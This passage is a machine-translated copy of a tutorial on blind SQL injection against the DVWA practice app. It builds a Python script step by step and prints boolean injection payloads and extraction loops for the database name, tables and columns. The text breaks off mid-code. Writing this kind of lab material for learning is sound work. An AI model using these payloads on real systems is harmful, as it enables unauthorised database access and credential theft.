<html>
<head>
<title>Burp Suite? No Thanks! Blind SQLi in DVWA With Python (Part 1)— StackZero</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第1部分)— StackZero</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-i-exploited-blind-sqli-without-using-any-tool-stackzero-396e831ecbdf?source=collection_archive---------0-----------------------#2022-10-18">https://infosecwriteups.com/how-i-exploited-blind-sqli-without-using-any-tool-stackzero-396e831ecbdf?source=collection_archive---------0-----------------------#2022-10-18</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/19f5d2bb5425aa1e0e1104597b0cabac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fy5c7sLwWKVRzdS3Q2Rmzw.jpeg"/></div></div></figure><blockquote class="kb kc kd"><p id="1882" class="ke kf kg kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">本文原载于<a class="ae ld" href="https://www.stackzero.net/blind-sql-injection-dvwa-low-security-with-python/" rel="noopener ugc nofollow" target="_blank">https://www . stack zero . net/blind-SQL-injection-dvwa-low-security-with-python/</a></p></blockquote><p id="abc6" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">嗨黑客们！这里有另一篇文章将展示如何在实践中利用一个已知的漏洞。<br/>特别是，这次我们将使用Python开发<a class="ae ld" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>的盲SQL注入段。</p><p id="4c94" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我想向您展示一个一体化脚本，一旦运行它，您将获得在看不到查询结果的环境中获取管理员密码所需的所有信息。</p><p id="fe28" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这就是最终的结果:</p><figure class="li lj lk ll gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi lh"><img src="../Images/9a05faf953f1e7f0ed7d02b5457de377.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7yI4pNvyzF-pWhT4C5PWBA.jpeg"/></div></div></figure><p id="d511" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">有很多方法可以解决这个难题，但我选择使用自定义脚本，主要原因如下:</p><ul class=""><li id="6581" class="lm ln it kh b ki kj km kn le lo lf lp lg lq lc lr ls lt lu bi translated">我们必须执行大量的调用，而<a class="ae ld" href="https://portswigger.net/burp" rel="noopener ugc nofollow" target="_blank">打嗝套件社区</a>版对入侵者的线程数量有限制</li><li id="7a1a" class="lm ln it kh b ki lv km lw le lx lf ly lg lz lc lr ls lt lu bi translated">我不想依赖外部工具</li><li id="6c2c" class="lm ln it kh b ki lv km lw le lx lf ly lg lz lc lr ls lt lu bi translated">理解一件事的最好方法是自己动手去做</li></ul><p id="cf49" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我充分意识到专业工具对渗透测试人员来说更好，无论如何，这个博客是我们学习的地方，我看不到更好的方法。</p><p id="35d7" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">也因为了解基础使你能够使用每一个工具！</p><h1 id="7df8" class="ma mb it bd mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx bi translated">什么是SQL盲注入？</h1><p id="be5e" class="pw-post-body-paragraph ke kf it kh b ki my kk kl km mz ko kp le na ks kt lf nb kw kx lg nc la lb lc im bi translated">盲SQL注入与普通SQL注入几乎相同，唯一的区别是数据库不将数据输出到web页面。<br/>存在漏洞的页面可能不会显示任何数据，但可能会显示当前用户名等内容。<br/>因此，攻击者被迫通过询问数据库来窃取数据:</p><ul class=""><li id="446a" class="lm ln it kh b ki kj km kn le lo lf lp lg lq lc lr ls lt lu bi translated">一系列对或错的问题(基于布尔型。</li><li id="2c76" class="lm ln it kh b ki lv km lw le lx lf ly lg lz lc lr ls lt lu bi translated">依靠睡眠功能的一系列基于时间的查询(基于时间)。</li></ul><p id="e715" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这使得利用SQL注入漏洞更加困难，但并非不可能，因为攻击者可能能够推断出结果。</p><p id="696e" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这种攻击可能非常耗时，因为需要为恢复的每个位创建一个新语句，并且可能包含许多不成功的请求。<br/>但是，有工具可以自动识别和利用这种SQL注入盲漏洞。通过使用你的编程技能，也有可能使过程自动化，这是我们在接下来的段落中操作的方式。</p><p id="e91c" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们已经在前面的教程中看到了什么是SQL注入以及如何进行这种类型的攻击。</p><p id="3fc5" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">如果你认为你不熟悉SQL注入，我建议你在阅读之前不要继续:</p><h1 id="d0e1" class="ma mb it bd mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx bi translated">带内SQL注入</h1><ul class=""><li id="d711" class="lm ln it kh b ki my km mz le nd lf ne lg nf lc lr ls lt lu bi translated"><a class="ae ld" href="https://medium.com/codex/sql-injection-what-you-need-to-know-stackzero-abc80bc1ea5e" rel="noopener"> SQL注入:您需要了解的内容</a></li><li id="2c10" class="lm ln it kh b ki lv km lw le lx lf ly lg lz lc lr ls lt lu bi translated">通过入侵易受攻击的应用程序，在实践中学习SQL注入！</li><li id="9ca9" class="lm ln it kh b ki lv km lw le lx lf ly lg lz lc lr ls lt lu bi translated"><a class="ae ld" href="https://medium.com/bugbountywriteup/how-to-hack-with-sql-injection-attacks-dvwa-low-security-stackzero-9286d7d0dfd1" rel="noopener">如何破解SQL注入攻击！DVWA低安全性</a></li><li id="d723" class="lm ln it kh b ki lv km lw le lx lf ly lg lz lc lr ls lt lu bi translated"><a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/hack-with-sql-injection-attacks-dvwa-medium-security-stackzero-d4af0a9a5f9">黑客用SQL注入攻击！DVWA中等安全性</a></li><li id="5a69" class="lm ln it kh b ki lv km lw le lx lf ly lg lz lc lr ls lt lu bi translated"><a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/hack-with-sql-injection-attacks-dvwa-high-security-stackzero-713638840515">用SQL注入攻击黑客！DVWA高安全性</a></li></ul><h1 id="1269" class="ma mb it bd mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx bi translated">盲人SQL注入</h1><ul class=""><li id="1975" class="lm ln it kh b ki my km mz le nd lf ne lg nf lc lr ls lt lu bi translated"><a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/how-i-exploited-blind-sqli-without-using-any-tool-stackzero-396e831ecbdf">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第1部分)</a></li><li id="d9c7" class="lm ln it kh b ki lv km lw le lx lf ly lg lz lc lr ls lt lu bi translated"><a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/burp-suite-no-thanks-blind-sqli-in-dvwa-with-python-part-2-stackzero-a5c0acf431dc">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第2部分)</a></li><li id="d396" class="lm ln it kh b ki lv km lw le lx lf ly lg lz lc lr ls lt lu bi translated"><a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/burp-suite-no-thanks-blind-sqli-in-dvwa-with-python-part-3-stackzero-911545003f01">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第3部分)</a></li></ul><h1 id="b5b2" class="ma mb it bd mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx bi translated">先决条件</h1><p id="304f" class="pw-post-body-paragraph ke kf it kh b ki my kk kl km mz ko kp le na ks kt lf nb kw kx lg nc la lb lc im bi translated">正如您所理解的，即使我们在DVWA上设置了较低的安全性，使用python的盲目SQL注入利用也需要更多的工作。</p><p id="ae54" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我假设你正在一台<a class="ae ld" href="https://medium.com/@stackzero/how-to-install-kali-linux-on-virtualbox-in-a-few-minutes-stackzero-37fb019261cb" rel="noopener"> Kali Linux </a>机器上工作，无论如何，如果你安装了Python 3，那将在任何地方工作。</p><p id="4124" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">开始之前，您应该使用<strong class="kh iu"> pip </strong>安装两个基本库:</p><p id="7369" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">通过在终端上键入以下命令:</p><pre class="li lj lk ll gt ng nh ni nj aw nk bi"><span id="0b52" class="nl mb it nh b gy nm nn l no np">pip install beautifulsoup4 requests</span></pre><p id="625f" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">为了从本教程中获得最佳效果，您还需要一个我为您编写的utils文件。</p><p id="f88d" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">你可以从GitHub的<a class="ae ld" href="https://github.com/StackZeroSec/dvwa/tree/main/blind_sqli" rel="noopener ugc nofollow" target="_blank">这个链接</a>获得它，或者你可以将下面的代码复制/粘贴到一个文件中，这个文件与你的主脚本在同一个目录下。</p><figure class="li lj lk ll gt ju"><div class="bz fp l di"><div class="nq nr l"/></div></figure><p id="d18e" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">它为你提供了一组类来简化与DVWA的连接和管理<a class="ae ld" href="https://en.wikipedia.org/wiki/Cross-site_request_forgery" rel="noopener ugc nofollow" target="_blank"> CSRF </a>令牌。我这样做是为了让你把注意力集中在失明的SQL注入身上。 <br/>显然，我们也可以从浏览器中获取会话令牌，但我发现那极其不舒服。</p><p id="2516" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">现在我们准备好了，让我们打开包含脚本的<em class="kg"> main.py </em>文件，让我们开始导入<em class="kg"> utils.py </em></p><pre class="li lj lk ll gt ng nh ni nj aw nk bi"><span id="9255" class="nl mb it nh b gy nm nn l no np">from utils import *</span></pre><h1 id="ccfd" class="ma mb it bd mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx bi translated">步骤#0:看一看Web应用程序</h1><p id="0253" class="pw-post-body-paragraph ke kf it kh b ki my kk kl km mz ko kp le na ks kt lf nb kw kx lg nc la lb lc im bi translated">像往常一样，我在一台DVWA机器上测试这个用于盲人SQL注入的Python脚本，该机器来自<a class="ae ld" href="https://tryhackme.com/room/dvwa" rel="noopener ugc nofollow" target="_blank"> TryHackMe </a>的低安全级别。</p><p id="6436" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们已经看到<a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/how-to-hack-with-sql-injection-attacks-dvwa-low-security-stackzero-9286d7d0dfd1">在这里</a>如何设置我们需要的东西。</p><p id="b8ca" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">因此，让我们连接到给定的IP并输入:</p><ul class=""><li id="67ca" class="lm ln it kh b ki kj km kn le lo lf lp lg lq lc lr ls lt lu bi translated"><strong class="kh iu">用户名:</strong>管理员</li><li id="ff5a" class="lm ln it kh b ki lv km lw le lx lf ly lg lz lc lr ls lt lu bi translated"><strong class="kh iu">密码:</strong>密码</li></ul><figure class="li lj lk ll gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ns"><img src="../Images/748e8ba525d6c86744455cc05abfc672.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TnXQ___qDTx-KL2cgm-FqQ.jpeg"/></div></div></figure><p id="4a5f" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">之后，进入设置，设置安全级别为“低”，如下图所示。</p><figure class="li lj lk ll gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ns"><img src="../Images/d9a23f35ca82859bf9a6c87c8b00ff97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MI4Qcgaz8E1thfe3NZSfIA.jpeg"/></div></div></figure><p id="d77e" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">现在我们将安全性设置为低，我们可以在左侧菜单中点击<strong class="kh iu"> SQL Injection (Blind) </strong>并在编写python脚本之前查看DVWA的漏洞。</p><p id="a91c" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">从这里我们可以推断出一堆信息，让我们看看是什么。</p><p id="3725" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">首先，我们可以尝试插入一个随机值，看看结果，比如用“1”试试</p><figure class="li lj lk ll gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nt"><img src="../Images/9fec0f19b098a4d837a632e26e1c1270.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BUM77KmtuD9S_GvmeomDww.jpeg"/></div></div></figure><p id="f560" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">如果我们对更大的数字如“100”做同样的处理，结果是:</p><figure class="li lj lk ll gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nu"><img src="../Images/5b87978bd835fe026fb8b538d6a1bcfe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0ow_epZj4lLZGSxPeI9LrQ.jpeg"/></div></div></figure><p id="9cef" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">通过查看浏览器栏中的URL，我们看到类似这样的内容:</p><p id="fd33" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><code class="fe nv nw nx nh b"><a class="ae ld" href="http://10.10.201.172/vulnerabilities/sqli_blind/?id=100&amp;Submit=Submit#" rel="noopener ugc nofollow" target="_blank">http://10.10.201.172/vulnerabilities/sqli_blind/?id=100&amp;Submit=Submit#</a></code></p><p id="ad38" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这表明该查询是作为一个<a class="ae ld" href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods" rel="noopener ugc nofollow" target="_blank"> HTTP GET请求</a>传递的。</p><p id="2292" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">在处理代码之前，最后一条信息是检查输入是否易受攻击。</p><p id="1303" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们试着插入:<code class="fe nv nw nx nh b">1' OR 1=1#</code></p><p id="ade4" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">它表示用户存在，因此我们可以清楚地看到漏洞的存在。</p><h1 id="6289" class="ma mb it bd mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx bi translated">步骤1:检查查询结果</h1><p id="61e1" class="pw-post-body-paragraph ke kf it kh b ki my kk kl km mz ko kp le na ks kt lf nb kw kx lg nc la lb lc im bi translated">即使它应该是一个快速脚本，我们也不想重复自己，所以我们可以定义一个函数来构建查询，调用服务器，如果服务器给我们一个肯定的响应，则返回<strong class="kh iu"> true </strong>，否则返回<strong class="kh iu"> false </strong>。</p><pre class="li lj lk ll gt ng nh ni nj aw nk bi"><span id="2026" class="nl mb it nh b gy nm nn l no np">def get_query_result(s, sqli_blind_url, query, *args):<br/>    try:<br/>        concrete_query = query.format(*args)<br/>        response = s.get(f"{sqli_blind_url}?id={concrete_query}&amp;Submit=Submit#")<br/>        parser = DVWASQLiResponseParser(response)<br/>        return parser.check_presence("exist")<br/>    except AttributeError as e:<br/>        return False</span></pre><p id="2b41" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">它接受可变数量的参数，格式化查询，并使用来自utils的解析器来获得响应。很明显，这里没有强大的错误检查功能，但是我们的目标是取代打嗝，尽可能多地学习盲SQL注入，而不是软件架构！</p><h1 id="d234" class="ma mb it bd mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx bi translated">第2步:管理登录到DVWA和CSRF令牌</h1><p id="b85a" class="pw-post-body-paragraph ke kf it kh b ki my kk kl km mz ko kp le na ks kt lf nb kw kx lg nc la lb lc im bi translated">我提供给你的类负责管理登录和整个会话，在某种程度上隐藏了所有的内部。<br/>如果你想在DVWA中操作，你只需要把你所有的代码放到with子句中，并在DVWASessionProxy上使用GET/POST方法，就像你处理来自<a class="ae ld" href="https://requests.readthedocs.io/en/latest/" rel="noopener ugc nofollow" target="_blank">请求</a>的经典<a class="ae ld" href="https://requests.readthedocs.io/en/latest/api/?highlight=session#requests.Session" rel="noopener ugc nofollow" target="_blank">会话</a>一样。</p><p id="8f91" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">您也可以直接从代理设置安全属性。</p><p id="e1d8" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这是一个最小的例子:</p><pre class="li lj lk ll gt ng nh ni nj aw nk bi"><span id="13d6" class="nl mb it nh b gy nm nn l no np">with DVWASessionProxy(BASE_URL) as s:<br/>    s.security = SecurityLevel.LOW<br/>    # Put here your code</span></pre><p id="c460" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">好了，我们完成了准备工作，是时候写我们的主函数了，但是在开始真正的代码之前，我们必须在一个非常明显的地方写一个包含目标IP的变量。</p><p id="8be4" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这是必需的，因为它对于每个实例都是变化的，所以让我们声明它:</p><pre class="li lj lk ll gt ng nh ni nj aw nk bi"><span id="bc17" class="nl mb it nh b gy nm nn l no np">if __name__ == "__main__":<br/>    BASE_URL = "http://10.10.227.17" #change this value with the ip of DVWA machine<br/>    sqli_blind_url = f"{BASE_URL}/vulnerabilities/sqli_blind"</span></pre><h1 id="6245" class="ma mb it bd mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx bi translated">步骤3:在一次盲目的SQLi攻击中获取数据库名称</h1><p id="1de4" class="pw-post-body-paragraph ke kf it kh b ki my kk kl km mz ko kp le na ks kt lf nb kw kx lg nc la lb lc im bi translated">我们不能像对SQL注入那样简单地打印数据库的名称，所以在这种情况下，我们需要得到长度，然后尝试逐个字符地猜测。</p><p id="ff27" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们已经从介绍中的GUI看到没有输入控件，所以我们可以利用这一点。<br/>首先，我们需要运行这样一个查询:<br/> <code class="fe nv nw nx nh b">"1' AND LENGTH(DATABASE()) = n #"</code></p><p id="ebe3" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">其中<em class="kg"> n </em>变化。<br/> <strong class="kh iu">有一个小问题，URL中的hashtag表示那个的结束(</strong> <a class="ae ld" rel="noopener ugc nofollow" target="_blank" href="/how-to-exploit-dom-xss-on-dvwa-stackzero-c83a682ed7b7"> <strong class="kh iu">这里</strong> </a> <strong class="kh iu">可以看到一个解释)，所以我们要用它的URL编码的等价物来代替:“%23”。</strong></p><p id="0a8f" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">所以我们可以选择一个任意长的n并循环，直到响应包含了<em class="kg">“exists”</em>单词。</p><p id="6d18" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">在python中我们是这样做的:</p><pre class="li lj lk ll gt ng nh ni nj aw nk bi"><span id="544e" class="nl mb it nh b gy nm nn l no np">query = "1' AND LENGTH(DATABASE()) = {} %23"<br/>        length = 0<br/>for i in range(10):<br/>    if get_query_result(s, sqli_blind_url, query, i):<br/>        print(f"[+] The DB's name length is {i}")<br/>        length = i</span></pre><p id="07f4" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">一旦我们将数据库名称的长度保存到一个变量中，我们就可以试着猜测它。</p><p id="9a72" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这一次，我们要检查字符串从第一个位置到最后一个位置的每个字符，并与每个可能的字符进行比较。<br/>显然，如果我们猜测字符，应用程序将返回<em class="kg">“用户id存在……”</em>。我们只需要构建一个包含所有正确字符的字符串。<br/>代码是:</p><pre class="li lj lk ll gt ng nh ni nj aw nk bi"><span id="6de8" class="nl mb it nh b gy nm nn l no np">query = "1' AND SUBSTRING(DATABASE(), {}, 1) = '{}'%23"<br/>        dbname = []<br/><br/>for i in range(1, length+1):<br/>    for c in string.ascii_lowercase:<br/>        if get_query_result(s, sqli_blind_url, query, i, c):<br/>             dbname.append(c)<br/>             break<br/>    dbname = "".join(dbname)<br/>    print(f'[+] Found a database with name: {dbname}')</span></pre><p id="bbfd" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这段代码有两个嵌套循环，外层循环是字符的索引，内层循环负责测试“string.ascii_lowercase”集合中的每个字符。</p><p id="2ced" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">最后，我们得到了数据库的名称，它存储在变量<em class="kg">“dbname”</em>中。</p><p id="4cab" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">注意:我使用了<a class="ae ld" href="https://www.w3schools.com/sql/func_mysql_substring.asp" rel="noopener ugc nofollow" target="_blank"> SUBSTRING </a>函数来获取字符，它接受以下参数:</p><ul class=""><li id="ab9c" class="lm ln it kh b ki kj km kn le lo lf lp lg lq lc lr ls lt lu bi translated">主弦</li><li id="0617" class="lm ln it kh b ki lv km lw le lx lf ly lg lz lc lr ls lt lu bi translated">第一个子字符串的字符位置</li><li id="efde" class="lm ln it kh b ki lv km lw le lx lf ly lg lz lc lr ls lt lu bi translated">子字符串的字符数</li></ul><h1 id="04af" class="ma mb it bd mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx bi translated">步骤4:在一次盲目的SQLi攻击中获取表名</h1><p id="0e12" class="pw-post-body-paragraph ke kf it kh b ki my kk kl km mz ko kp le na ks kt lf nb kw kx lg nc la lb lc im bi translated">下一步与上一步类似，这一次的目标是获取数据库中所有表的名称，在此之前，即使是这一次，我们也需要知道有多少个表。</p><p id="e54b" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">多亏了MySQL中的<a class="ae ld" href="https://www.w3schools.com/sql/func_mysql_count.asp" rel="noopener ugc nofollow" target="_blank">计数</a>函数，我们可以通过循环任意数量的整数(如果最终数字等于最大值，我们可以增加范围)来实现这一点:</p><pre class="li lj lk ll gt ng nh ni nj aw nk bi"><span id="e3c3" class="nl mb it nh b gy nm nn l no np">query = "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_type='base table' AND table_schema='{}')='{}'%23"<br/>n_tables = 0<br/>for i in range(1, 10):<br/>    if get_query_result(s, sqli_blind_url, query, dbname, i):<br/>        print(f"[+] It has {i} tables")<br/>        n_tables = i<br/>        break</span></pre><p id="5c57" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">一旦我们有了表的数量，我们就必须像猜测DB名称一样去做，唯一的区别是我们需要对每个表都这样做。</p><p id="d21b" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我们将要注入的查询如下:</p><p id="4721" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated"><code class="fe nv nw nx nh b">"1' AND SUBSTR((SELECT table_name from information_schema.tables WHERE table_type='base table' AND table_schema='dvwa' LIMIT 1),{},1)='{}'%23"</code></p><p id="7400" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这个查询与前一个查询一样利用了元表，其原理与我们看到的完全一样。<br/>不同的是，结果是一个元素列表，所以我们需要在提取字符之前<a class="ae ld" href="https://www.w3schools.com/mysql/mysql_limit.asp" rel="noopener ugc nofollow" target="_blank">将它们限制为一个。多亏了SQL </a><a class="ae ld" href="https://www.w3schools.com/mysql/mysql_limit.asp" rel="noopener ugc nofollow" target="_blank"> LIMIT子句</a>，我们才能做到这一点。</p><p id="c510" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">此时你的问题可能是:</p><p id="6319" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">一旦我找到了第一个表，我该如何进入下一个表？</p><p id="1b0a" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">有不同的技术，这里我将使用一个<code class="fe nv nw nx nh b">WHERE table_name &lt;&gt; 'found_table_name'</code>链(内置于变量<em class="kg">完成</em>)。<br/>在接下来的章节中，我将向您展示如何使用<a class="ae ld" href="https://www.w3schools.com/mysql/mysql_limit.asp" rel="noopener ugc nofollow" target="_blank"> LIMIT子句</a>实现同样的功能，就像程序员在他们的应用程序中实现分页一样。</p><pre class="li lj lk ll gt ng nh ni nj aw nk bi"><span id="f7ca" class="nl mb it nh b gy nm nn l no np">query = "1' AND SUBSTR((SELECT table_name from information_schema.tables WHERE table_type='base table' AND table_schema='{}' {} LIMIT 1),{},1)='{}'%23"<br/>        <br/>found_tables = [[] for _ in range(n_tables)]<br/>completion = ""<br/>for i in range(n_tables):        <br/>    for j in range(1, 10):<br/>        for c in string.ascii_lowercase:<br/>            if get_query_result(s, sqli_blind_url, query, dbname, completion, j, c):<br/>                found_tables[i].append(c)<br/>                break<br/>    print("\t","".join(found_tables[i]))<br/>    completion += f" AND table_name &lt;&gt; '{''.join(found_tables[i])}'"</span></pre><p id="43b5" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">很好，现在我们几乎已经看到了实现这个漏洞所需要的一切！<br/>你可能已经意识到，即使我们在安全级别较低的DVWA上，即使你决定不使用python，一个盲SQL注入也可能很棘手，一个有效的利用可能需要很大的努力。</p><h1 id="ae7b" class="ma mb it bd mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx bi translated">步骤#5:在一次隐蔽的SQLi攻击中获取列名</h1><p id="1371" class="pw-post-body-paragraph ke kf it kh b ki my kk kl km mz ko kp le na ks kt lf nb kw kx lg nc la lb lc im bi translated">我们几乎到了最有趣的部分，现在我们需要得到列名。<br/>和我们之前做的一样，我想知道列的数量，然后得到名称。<br/>当脚本的用户看到我们需要的表格(包含用户名和密码的表格)时，我还将为他提供用CTRL+C中断循环的可能性。这会节省更多的时间。</p><p id="7877" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">用户还必须插入目标表，以便最终我们可以运行一次脚本并获得用户名和密码。</p><pre class="li lj lk ll gt ng nh ni nj aw nk 